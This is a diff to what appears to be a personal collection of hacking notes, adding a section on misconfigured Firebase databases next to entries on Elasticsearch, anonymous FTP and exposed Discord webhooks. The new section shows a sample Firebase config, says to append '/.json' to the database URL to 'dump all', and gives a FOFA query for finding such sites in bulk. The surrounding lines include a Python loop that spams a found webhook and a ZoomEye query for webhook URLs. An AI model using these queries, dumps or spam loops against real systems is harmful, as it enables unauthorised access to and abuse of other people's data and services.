@@ -6,6 +6,7 @@
 * [Cassandra exposed databases authfree](https://github.com/komodoooo/Some-things/blob/main/papers.md#Cassandra-exposed-databases-authfree)
 * [Elasticsearch misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#Elasticsearch-misconfiguration)
 * [Find exposed discord webhooks](https://github.com/komodoooo/Some-things/blob/main/papers.md#Find-exposed-discord-webhooks)
+* [Firebase misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#Firebase-misconfiguration)
 * [FTP servers with anonymous login allowed ](https://github.com/komodoooo/Some-things/blob/main/papers.md#FTP-servers-with-anonymous-login-allowed)
 * [Fujitsu IP series hardcoded credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#Fujitsu-IP-series-hardcoded-credentials)
 * [Jenkins code execution](https://github.com/komodoooo/Some-things/blob/main/papers.md#Jenkins-code-execution)
@@ -56,6 +57,22 @@ while True: __import__("requests").post("<webhook>", data={"content":"@here hey"
 [`"https://discord.com/api/webhooks/"`](https://www.zoomeye.org/searchResult?q=%22https%5C%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F%22)
 #### But... Can i automate this?
 The answer is obviously yes, i made [this](https://github.com/komodoooo/discord-stuff/blob/main/src/zw.py) script.
+# Firebase misconfiguration
+The code snippet used to connect to firebase is often leaved in the main html page of websites, and it looks like this:
+```js
+var config = {
+    apiKey: "3x4mpl3",
+    authDomain: "example.firebaseapp.com",
+    databaseURL: "https://example.firebaseio.com",
+    projectId: "example",
+    storageBucket: "example.appspot.com",
+    messagingSenderId: "6969"
+};
+firebase.initializeApp(config);
+```
+Just go to _**database url** + `/.json`_ to dump all
+### FOFA query
+[`body="firebase.initializeApp(config);" && body="databaseURL"`](https://fofa.info/result?qbase64=Ym9keT0iZmlyZWJhc2UuaW5pdGlhbGl6ZUFwcChjb25maWcpOyIgJiYgYm9keT0iZGF0YWJhc2VVUkwi)
 # Elasticsearch misconfiguration
 ### View all indices
 Base URL + `/_cat/indices?v`
